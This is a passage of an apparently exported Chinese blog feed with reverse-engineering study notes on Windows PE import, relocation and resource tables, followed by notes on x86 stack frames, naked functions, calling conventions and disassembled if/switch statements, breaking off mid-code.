Name</h4><p>​这个结构体变量也是一个RVA，直接指向一个字符串，这个字符串就是这个导入表对应的DLL的名字。一个导入表只对应一个DLL。存在多个导入表，则对应目录项里的VirtualAddress(RVA)指向的是所有导入表的首地址，每个导入表占20字节，挨着。最后以一个空结构体作为结尾(20字节全0结构体)。</p><h4 id="firstaddress"><a class="markdownIt-Anchor" href="#firstaddress"></a> FirstAddress</h4><ul><li><p>FirstAddress(RVA)指向的就是<strong>IAT表</strong>。IAT表也是每个数据占4个字节。最后以4字节0结尾。</p></li><li><p><code>PE加载：</code></p><ul><li><p>PE加载前，IAT表和INT表完全相同，此时IAT表可以判断函数导出序号，或指向函数名字结构体</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291129288.png" alt="202302261010635" /></p></li><li><p>PE加载后：IAT表发生变化，系统会现根据结构体变量Name加载对应的dll(拉伸)，读取dll的导出表，对应原程序的INT表，匹配dll导出函数的地址，返回其地址，贴在对应的IAT表上，挨个修正地址(即GetPeocAddress)</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291129939.png" alt="202302261010941" /></p></li></ul></li></ul><h3 id="image_thunk_data"><a class="markdownIt-Anchor" href="#image_thunk_data"></a> <strong>IMAGE_THUNK_DATA</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_THUNK_DATA32</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        DWORD ForwarderString;      <span class="hljs-comment">// PBYTE </span><br>        DWORD Function;             <span class="hljs-comment">// PDWORD，被输入的函数的内存地址</span><br>        DWORD Ordinal;   <span class="hljs-comment">// 被输入的API的序数值</span><br>        DWORD AddressOfData;        <span class="hljs-comment">// RVA 指向_IMAGE_IMPORT_BY_NAME </span><br>    &#125; u1;<br>&#125; IMAGE_THUNK_DATA32;<br><span class="hljs-keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;<br></code></pre></td></tr></table></figure><ul><li>首先要判断最高位是否为1，如果最高位的值为1，那么去除最高位的值之后，即为函数的导出序号</li><li>如果最高位的值不为1，那么这个值就是一个RVA，在转成FOA之后指向<code>IMAGE_IMPORT_BY_NAME</code>这个结构</li></ul><h3 id="image_import_by_name"><a class="markdownIt-Anchor" href="#image_import_by_name"></a> IMAGE_IMPORT_BY_NAME</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_IMPORT_BY_NAME</span> &#123;</span>                <br>    WORD    Hint;                <br>    BYTE    Name[<span class="hljs-number">1</span>];                <br>&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;<br></code></pre></td></tr></table></figure><ul><li>Hint为2字节，为当前函数在导出表中的索引，但是这个值一般起不到什么作用。我们思考一下，如果我们最高位值为1是以序号导出，最高位值不为1则以名字导出，而以名字导出的时候我们才会用到<code>IMAGE_IMPORT_BY_NAME</code>结构，但是我们按名字导出也就不需要管函数的索引了，所以Hint这个值可以忽略，在一些编译器里面会直接将Hint的值置为0。</li><li>我们主要是看一下<code>Name[1]</code>这个结构，可以看到它是BYTE，大小为1字节。因为考虑到了函数名字长度的不确定性，设计者只将函数开头的1字节存到<code>Name[1]</code>这个结构中，函数名是以<code>\0</code>结尾的，也就是说在找到<code>Name[1]</code>里面所存的首字节后，一直往后遍历，直到找到0即为函数名的结束。</li></ul><h3 id="绑定导入表"><a class="markdownIt-Anchor" href="#绑定导入表"></a> 绑定导入表</h3><p>​PE在加载前INT、IAT表都指向一个名称表，但是有的exe程序，在打印IAT表的时候，会发现里面是地址。这是因为我们的PE程序在加载的时候，IAT表会填写函数地址。但是这就造成了一个问题，PE程序启动慢，每次启动都要给IAT表填写函数地址。那么这里我们就可以使用到绑定导入表来使PE程序的启动变快。</p><ul><li>注意：<code>TimeDataStamp</code>(时间戳)。PE加载EXE相关的DLL时，首先会根据<code>IMAGE_IMPORT_DESCRIPTOR</code>结构中的<code>TimeDateStamp</code>来判断是否要重新计算IAT表中的地址。若<code>TimeDataStamp == 0</code> 则未绑定，<code>TimeDataStamp == -1</code> 则已绑定<ul><li>一般的PE文件在加载前INT和IAT表中都是指向<code>IMAGE_IMPORT_BY_NAME</code>这张表的，也就是说INT表和IAT表在PE加载前表中所存的内容都是一样的。</li><li>PE在加载后，IAT表里存的才是函数的地址，这种情况就属于没有绑定导入表的情况，即<code>TimeDataStamp</code>为0的情况。</li></ul></li></ul><p>​真正的绑定导入表位于目录的第12项，其中<code>TimeDataStamp</code>为真正的时间戳，<code>OffsetModuleName</code>为剩余dll的名字，<code>NumberOfModuleForwarderRefs</code>为依赖dll的数量</p><h4 id="image_bound_import_descriptor"><a class="markdownIt-Anchor" href="#image_bound_import_descriptor"></a> IMAGE_BOUND_IMPORT_DESCRIPTOR</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_BOUND_IMPORT_DESCRIPTOR</span> &#123;</span><br>    DWORD   TimeDateStamp;　　　　　　　　　　　　　　　　<span class="hljs-comment">//真正的时间戳</span><br>    WORD    OffsetModuleName;　　　　　　　　　　　　　　<span class="hljs-comment">//DLL的名字,PE的文件名</span><br>    WORD    NumberOfModuleForwarderRefs;　　　　　　　　<span class="hljs-comment">//依赖的另外的DLL有几个</span><br><span class="hljs-comment">// Array of zero or more IMAGE_BOUND_FORWARDER_REF follows</span><br>&#125; IMAGE_BOUND_IMPORT_DESCRIPTOR,  *PIMAGE_BOUND_IMPORT_DESCRIPTOR;<br></code></pre></td></tr></table></figure><ul><li><p>其中要注意的是<code>OffsetModuleName</code>这个值有点特殊，它既不是foa，也不是rva，它的计算公式为第一个<code>DESCRIPTOR</code>的值加上所在结构体的<code>OffsetMoudeleName</code>得到。如果<code>NumberOfModuleForwarderRefs</code>的值为2，则绑定导入表一共就有3个dll。</p></li><li><p>如果<code>NumberOfModuleForwarderRefs</code>的值不为0，绑定导入表下面还会跟一张依赖dll的绑定导入表结构，含义的话跟绑定导入表相同，<code>Reserved</code>值可以不用管。</p><ul><li><pre class="highlight"><code class="c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_BOUND_FORWARDER_REF</span> &#123;</span>    DWORD   TimeDateStamp;    WORD    OffsetModuleName;    WORD    Reserved;&#125; IMAGE_BOUND_FORWARDER_REF, *PIMAGE_BOUND_FORWARDER_REF;&lt;!--code￼<span class="hljs-number">13</span>--&gt;</code></pre></li></ul></li><li><p><code>VirtualAddress</code>：存放真正重定位表地址的RVA</p></li><li><p><code>Size</code>：重定位表的大小</p></li></ul><h3 id="image_base_relocation"><a class="markdownIt-Anchor" href="#image_base_relocation"></a> IMAGE_BASE_RELOCATION</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_BASE_RELOCATION</span> &#123;</span><br>    DWORD   VirtualAddress;  <span class="hljs-comment">//RVA</span><br>    DWORD   SizeOfBlock;<br>&#125; IMAGE_BASE_RELOCATION;<br><span class="hljs-keyword">typedef</span> IMAGE_BASE_RELOCATION ，* PIMAGE_BASE_RELOCATION;<br></code></pre></td></tr></table></figure><h4 id="sizeofblock"><a class="markdownIt-Anchor" href="#sizeofblock"></a> SizeOfBlock</h4><ul><li>重定位表的核心结构，存储的值以字节为单位，表示的是重定位表的大小</li></ul><h4 id="判断重定位表的数量"><a class="markdownIt-Anchor" href="#判断重定位表的数量"></a> 判断重定位表的数量</h4><ul><li>规定在最后一个结构的VirtualAddress和SizeOfBlock的值都为0，这里就可以进行判断来获取重定位表有多少个结构<ul><li><p>例如：假设重定位结构的数量为3，那么在最后8字节即VirtualAddress和SizeOfBlock的值都为0，可以说重定位表就是很多个块结构所构成的。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291129308.png" alt="202302261049857" /></p></li></ul></li></ul><h4 id="具体项"><a class="markdownIt-Anchor" href="#具体项"></a> 具体项</h4><ul><li>在每一块结构的VirtualAddress和SizeOfBlock里面，都有很多宽度为2字节的十六进制数据，这里我们称他们为具体项。</li><li>在内存中页大小的值为1000H，即2的12次方，也就是通过这个1000H就能够表示出一个页里面所有的偏移地址。而具体项的宽度为16位，页大小的值为低12位。</li><li>高四位为0011或0000，对应的十进制就是3或0.<ul><li><strong>当高4位的值为0011</strong>，我们需要修复的数据地址就是VirtualAddress + 低12位的值。<ul><li>例如VirtualAddress是0x12345678，具体项的数值为001100000001，那么这个值就是有意义的，需要修改的RVA = 0x12345678+0x00000001 = 0x12345679。</li></ul></li><li><strong>当高4位的值为0000</strong>，这里就不需要进行重定位的修改，这里的具体项只是用于数据对齐的数据。</li></ul></li></ul><h2 id="资源表"><a class="markdownIt-Anchor" href="#资源表"></a> 资源表</h2><p>​**背景：**资源表是PE所有表里边最复杂的表，造成资源表复杂是有历史原因的，简单说就是微软设计PE的时候错误的以为只要定义16位中的资源类型就够了，后来发现远远不够，但是PE结构已经定下来了，只能在原有基础上修改，因此就造成了资源表这块比较不好理解。</p><ul><li>所谓的不好理解，就是它里边用到的结构，其中的属性会出现<strong>位段/位域</strong>的用法<ul><li>同一个4字节，要根据高位判断它到底是一个整数还是一个偏移；</li><li>偏移并不是RVA，而是相对于资源表的偏移</li></ul></li></ul><h3 id="image_resource_directory"><a class="markdownIt-Anchor" href="#image_resource_directory"></a> IMAGE_RESOURCE_DIRECTORY</h3><p>资源目录的结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_RESOURCE_DIRECTORY</span> &#123;</span>                                <br>    DWORD   Characteristics;                        <span class="hljs-comment">//资源属性  保留 0        </span><br>    DWORD   TimeDateStamp;                        <span class="hljs-comment">//资源创建的时间        </span><br>    WORD    MajorVersion;                        <span class="hljs-comment">//资源版本号 未使用 0        </span><br>    WORD    MinorVersion;                        <span class="hljs-comment">//资源版本号 未使用 0        </span><br>    WORD    NumberOfNamedEntries;                        <span class="hljs-comment">//以名称命名的资源数量        </span><br>    WORD    NumberOfIdEntries;                           <span class="hljs-comment">//以ID命名的资源数量        </span><br><span class="hljs-comment">//  IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[];                                </span><br>&#125; IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;<br></code></pre></td></tr></table></figure><h3 id="资源表的真正结构"><a class="markdownIt-Anchor" href="#资源表的真正结构"></a> 资源表的真正结构</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291129287.png" alt="202302261111997" /></p><ul><li>其中每一层都有一个资源目录这个结构，这个结构的意义就是用来统计有多少个<code>IMAGE_RESOURCE_DIRECTORY_ENTRY</code>结构</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_RESOURCE_DIRECTORY_ENTRY</span> &#123;</span>                                <br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span>                            <span class="hljs-comment">//目录项的名称、或者ID        </span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>                                <br>            DWORD NameOffset:<span class="hljs-number">31</span>;                                <br>            DWORD NameIsString:<span class="hljs-number">1</span>;                                <br>        &#125;;                                <br>        DWORD   Name;                                <br>        WORD    Id;                                <br>    &#125;;                                <br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span>                                <br>        DWORD   OffsetToData;                        <span class="hljs-comment">//目录项指针        </span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>                                <br>            DWORD   OffsetToDirectory:<span class="hljs-number">31</span>;                                <br>            DWORD   DataIsDirectory:<span class="hljs-number">1</span>;                                <br>        &#125;;                                <br>    &#125;;                                <br>&#125; IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;<br></code></pre></td></tr></table></figure><ul><li><code>IMAGE_RESOURCE_DIRECTORY_ENTRY</code>这个结构在每一层里面的含义都不相同，在第一层用来判断资源的类型，第二层用来判断资源的编号，第三层表示的是代码页</li></ul><h4 id="第一层"><a class="markdownIt-Anchor" href="#第一层"></a> 第一层</h4><h5 id="第一个联合体"><a class="markdownIt-Anchor" href="#第一个联合体"></a> 第一个联合体</h5><ul><li><p><code>资源类型</code>：每种资源有类型及名字，它们是数值标识符或字符串。windows定义了十六种预定义类型，如光标对应1，位图对应2，图标对应3等等。而资源类型既可以用序号表示，也可以用字符串表示。第一层里Name表示的就是资源类型，使用NameIsString判断资源类型用什么表示</p><ul><li><p><code>DWORD NameOffset:31;</code> 和 <code>DWORD NameIsString:1;</code> 这两个值，</p><ul><li><code>NameOffset:31</code>就是表示占低31位，而<code>NameIsString</code>则占剩下的1位</li></ul></li><li><p>当最高位为1时，即<code>NameIsString = 1</code> 时，低31位为一个UNICODE指针，指向<code>_IMAGE_RESOURCE_DIR_STRING_U</code>结构，在这个结构里面<code>Length</code>表示长度，<code>NameString[1]</code>表示的是真正UNICODE起始的地址(字符串表示)</p><ul><li><pre class="highlight"><code class="c">ypedef <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_RESOURCE_DIR_STRING_U</span> &#123;</span>                            WORD    Length;                            WCHAR   NameString[ <span class="hljs-number">1</span> ];                        &#125; IMAGE_RESOURCE_DIR_STRING_U, *PIMAGE_RESOURCE_DIR_STRING_U;&lt;!--code￼<span class="hljs-number">17</span>--&gt;</code></pre></li></ul></li><li><p><code>VirtualAddress</code>是RVA，表示资源真正存储的位置，</p></li><li><p><code>Size</code>表示资源的大小</p></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>逆向笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>C &amp; C++</title>
    <link href="/posts/4356fc58.html"/>
    <url>/posts/4356fc58.html</url>
    
    <content type="html"><![CDATA[<h1 id="函数"><a class="markdownIt-Anchor" href="#函数"></a> 函数</h1><h2 id="堆栈"><a class="markdownIt-Anchor" href="#堆栈"></a> 堆栈</h2><h3 id="函数概念"><a class="markdownIt-Anchor" href="#函数概念"></a> 函数概念</h3><ul><li><p>计算机的函数，是一个固定的一个程序段，或称其为一个子程序，它在可以实现固定运算功能的同时还带有一入口和一个出口，所谓的入口，就是函数所带的各个参数，我们可以通过这个入口，把函数的参数值代入子程序，供计算机处理，所谓出口，就是指函数的计算结果,也称为返回值，在计算机求得之后，由此口带回给调用它的程序。</p></li><li><p>汇编中的函数</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291123136.png" alt="202210032043850" /></p></li><li><p>函数的入口</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291123438.png" alt="202210032043993" /></p><ul><li>存储变量传递给函数除了存入堆栈中，也可以存入其余的寄存器中</li></ul></li><li><p>函数的出口</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291123896.png" alt="202210032044374" /></p><ul><li>函数的计算结果除了放在寄存器中，还可以放到堆栈中</li></ul></li></ul><h3 id="winodws堆栈"><a class="markdownIt-Anchor" href="#winodws堆栈"></a> Winodws堆栈</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291123987.png" alt="202210032045557" /></p><ul><li>特点：<ul><li>先进后出</li><li>向低地址扩展(ESP向上移动要-4)</li></ul></li><li>堆栈平衡：<ul><li>Windows中的堆栈，是一块普通的内存，主要用来存储一些临时的数据和参数等</li><li>可以把Windows中的堆栈想象成是一个公用的书箱，函数就像是使用箱子的人，函数在执行的时候，会用到这个书箱，把一些数据存到里面。但用完的时候，一定要记得把书拿走，否则会乱的，也就是说，你放进去几本书，走的时候也要拿走几本书，这个就是堆栈平衡.</li></ul></li></ul><h3 id="操作"><a class="markdownIt-Anchor" href="#操作"></a> 操作</h3><ul><li>按Ctrl+G进行查找内存地址，按F2进行CPU定位(加断点)，之后按住OD上的暂停按钮使CPU达到此内存处，之后可以正常按F8进行步进</li><li>call需要按F7进行步入，遇到<code>jmp</code>按回车进行跳转<ul><li>F7指遇到函数跳入函数内部执行——单步步入</li><li>F8指直接执行函数，执行完之后到下一行——单步步过</li></ul></li><li>函数调用函数时，编译器会自动增加一个函数，用以检测是否堆栈平衡，按<code>enter</code>进入函数，按<code>-</code>退出</li></ul><h2 id="函数特点"><a class="markdownIt-Anchor" href="#函数特点"></a> 函数特点</h2><h3 id="函数分类"><a class="markdownIt-Anchor" href="#函数分类"></a> 函数分类</h3><p><a href="https://learn.microsoft.com/zh-cn/cpp/cpp/naked-cpp?view=msvc-170">naked (C++)</a></p><h4 id="裸函数"><a class="markdownIt-Anchor" href="#裸函数"></a> 裸函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __declspec(naked) Function()<br>&#123;<br>  <span class="hljs-comment">// 编译器不对裸函数进行任何处理，无法堆栈平衡，需要自己平衡堆栈</span><br>  __asm<br>    &#123;<br>        ret<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="无参数无返回值函数"><a class="markdownIt-Anchor" href="#无参数无返回值函数"></a> 无参数无返回值函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __declspec(naked) Function()  <br>&#123;<br>__asm<br>&#123;<br>  <span class="hljs-comment">// 提升堆栈，为函数执行提供空间</span><br>push ebp<br>mov ebp,esp<br>sub esp,<span class="hljs-number">0x40</span><br>  <span class="hljs-comment">// 保留现场</span><br>push ebx<br>push esi<br>push edi<br>  <span class="hljs-comment">// 向分配空间填充数据</span><br>lea edi,dword ptr ds:[ebp<span class="hljs-number">-0x40</span>]<br>mov eax,<span class="hljs-number">0xCCCCCCCC</span><br>mov ecx,<span class="hljs-number">0x10</span><br>rep stosd<br>    <span class="hljs-comment">/*此处实现函数功能*/</span><br>  <span class="hljs-comment">// 恢复现场，将之前保留的寄存器值恢复</span><br>pop edi<br>pop esi<br>pop ebx<br>  <span class="hljs-comment">// 降低堆栈   </span><br>mov esp,ebp<br>  <span class="hljs-comment">// 恢复栈底   </span><br>pop ebp<br>  <span class="hljs-comment">// 函数执行完毕，返回到调用处</span><br>ret<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="有参数有返回值函数"><a class="markdownIt-Anchor" href="#有参数有返回值函数"></a> 有参数有返回值函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __declspec(naked) Function(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)  <br>&#123;<br>__asm<br>&#123;<br>push ebp<br>mov ebp,esp<br>sub esp,<span class="hljs-number">0x40</span><br>push ebx<br>push esi<br>push edi<br>lea edi,dword ptr ds:[ebp<span class="hljs-number">-0x40</span>]<br>mov eax,<span class="hljs-number">0xCCCCCCCC</span><br>mov ecx,<span class="hljs-number">0x10</span><br>rep stosd<br>            <br><span class="hljs-comment">/*函数功能实现*/</span><br>mov eax,dword ptr ds:[ebp+<span class="hljs-number">8</span>]<br>add eax,dword ptr ds:[ebp+<span class="hljs-number">0xC</span>]<br><br>pop edi<br>pop esi<br>pop ebx<br>mov esp,ebp<br>pop ebp<br><br>ret<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="带局部变量的函数"><a class="markdownIt-Anchor" href="#带局部变量的函数"></a> 带局部变量的函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __declspec(naked) Function(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)  <br>&#123;<br>__asm<br>&#123;<br>push ebp<br>mov ebp,esp<br>sub esp,<span class="hljs-number">0x40</span><br>push ebx<br>push esi<br>push edi<br>lea edi,dword ptr ds:[ebp<span class="hljs-number">-0x40</span>]<br>mov eax,<span class="hljs-number">0xCCCCCCCC</span><br>mov ecx,<span class="hljs-number">0x10</span><br>rep stosd<br>          <br>  <span class="hljs-comment">/*局部变量引入*/</span><br>mov dword ptr ds:[ebp<span class="hljs-number">-4</span>],<span class="hljs-number">2</span><br>mov dword ptr ds:[ebp<span class="hljs-number">-8</span>],<span class="hljs-number">3</span><br><br>mov eax,dword ptr ds:[ebp+<span class="hljs-number">8</span>]<br>add eax,dword ptr ds:[ebp+<span class="hljs-number">0xC</span>]<br><br>pop edi<br>pop esi<br>pop ebx<br>mov esp,ebp<br>pop ebp<br><br>ret<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="调用约定"><a class="markdownIt-Anchor" href="#调用约定"></a> 调用约定</h3><table><thead><tr><th>调用约定</th><th>参数压栈顺序</th><th>平衡堆栈</th></tr></thead><tbody><tr><td>__cdecl</td><td>从右至左入栈</td><td>调用者清理栈(外平栈)</td></tr><tr><td>__stdcall</td><td>从右至左入栈</td><td>自身清理栈(内平栈)</td></tr><tr><td>__fastcall</td><td>ECX/EDX传送前两个，剩下:从右至左入栈</td><td>自身清理栈(内平栈)</td></tr></tbody></table><span class="label label-info">__fastcall的参数只有大于两个才需要內平栈，两个参数直接传递寄存器，不需要平衡堆栈</span><h3 id="函数参数"><a class="markdownIt-Anchor" href="#函数参数"></a> 函数参数</h3><h4 id="一般方式"><a class="markdownIt-Anchor" href="#一般方式"></a> 一般方式</h4><ol><li><p>观察调用处的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push        3<br>push        2<br>push        1<br>call       0040100f<br></code></pre></td></tr></table></figure></li><li><p>找到平衡堆栈的代码(外平栈)或者函数内部(內平栈)继续论证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">call        0040100f<br>add         esp,0Ch<br><br>ret 4/8/0xC/0x10<br></code></pre></td></tr></table></figure></li><li><p>将二者结合，确定参数个数</p></li></ol><h4 id="观察代码"><a class="markdownIt-Anchor" href="#观察代码"></a> 观察代码</h4><ol><li><p>不考虑ebp、esp</p></li><li><p>只找给别人赋值的寄存器eax/ecx/edx/ebx/esi/edi</p></li><li><p>找到以后追查其来源，如果该寄存器中的值不是在<strong>函数内存赋值</strong>的，那一定是传进来的参数</p></li><li><p>获得参数数量</p><ul><li><p>公式一：寄存器 + ret  4 = 参数个数</p></li><li><p>公式二：寄存器 + [ebp+8] + [ebp+0x] = 参数个数</p></li></ul></li></ol><h2 id="语句"><a class="markdownIt-Anchor" href="#语句"></a> 语句</h2><h3 id="ifelse"><a class="markdownIt-Anchor" href="#ifelse"></a> if……else</h3><ul><li>反汇编语句与if语句含义相反，即若if(x&gt;=1)，则反汇编中表达x&lt;1时跳转，否则继续顺序执行</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">Fun</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br><span class="hljs-keyword">if</span> (x &gt;= <span class="hljs-number">1</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(x&gt;=<span class="hljs-number">3</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291124190.png" alt="202212241152274" /></p><center><strong> if……else语句</strong></center><h3 id="switch"><a class="markdownIt-Anchor" href="#switch"></a> switch</h3><ol><li><p>分支小于4或者数据无规律时，用switch无意义，生成类似if……else的反汇编</p></li><li><p>Switch语句中数值相近时，会自动生成大表(连续数值中多个不存在时，会生成小表)</p><p><a href="https://www.cnblogs.com/Reverse-xiaoyu/p/11711393.html">switch…case…语句分析(大表跟小表何时产生)</a></p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">Fun</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br><span class="hljs-keyword">switch</span> (x) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br><span class="hljs-built_in">printf</span>(<span 